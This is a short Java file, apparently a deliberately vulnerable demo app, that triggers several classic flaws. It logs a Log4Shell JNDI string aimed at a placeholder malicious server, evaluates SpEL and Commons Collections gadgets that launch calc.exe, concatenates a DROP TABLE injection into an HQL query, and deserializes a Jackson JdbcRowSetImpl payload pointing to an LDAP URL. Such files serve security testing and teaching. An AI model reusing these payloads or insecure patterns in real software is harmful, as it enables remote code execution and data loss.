package com.vulnerable;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.hibernate.Session;
import org.hibernate.SessionFactory;
import org.hibernate.cfg.Configuration;
import org.springframework.expression.Expression;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.standard.SpelExpressionParser;
import com.fasterxml.jackson.databind.ObjectMapper;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.util.HashMap;
import java.util.Map;

public class App {
    private static final Logger logger = LogManager.getLogger(App.class);

    public static void main(String[] args) {
        demonstrateVulnerabilities();
    }

    public static void demonstrateVulnerabilities() {
        String userInput = "${jndi:ldap://malicious-server.com/exploit}";
        logger.info("User input: {}", userInput);

        ExpressionParser parser = new SpelExpressionParser();
        String spelInput = "T(java.lang.Runtime).getRuntime().exec('calc.exe')";
        Expression exp = parser.parseExpression(spelInput);
        exp.getValue();

        try {
            SessionFactory sessionFactory = new Configuration()
                    .configure()
                    .buildSessionFactory();
            
            Session session = sessionFactory.openSession();
            String maliciousInput = "'; DROP TABLE users; --";
            String query = "FROM User WHERE name = '" + maliciousInput + "'";
            session.createQuery(query).list();
        } catch (Exception e) {
            logger.error("Database error", e);
        }

        try {
            ObjectMapper mapper = new ObjectMapper();
            mapper.enableDefaultTyping();
            String json = "{\"@class\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://malicious-server/exploit\"}";
            mapper.readValue(json, Object.class);
        } catch (Exception e) {
            logger.error("Jackson deserialization error", e);
        }

        try {
            Map<String, String> innerMap = new HashMap<String, String>();
            innerMap.put("key", "value");
            
            InvokerTransformer transformer = new InvokerTransformer(
                "exec", 
                new Class[] {String.class}, 
                new Object[] {"calc.exe"}
            );
            
            Map outerMap = TransformedMap.decorate(innerMap, null, transformer);
        } catch (Exception e) {
            logger.error("Commons Collections error", e);
        }
    }
} 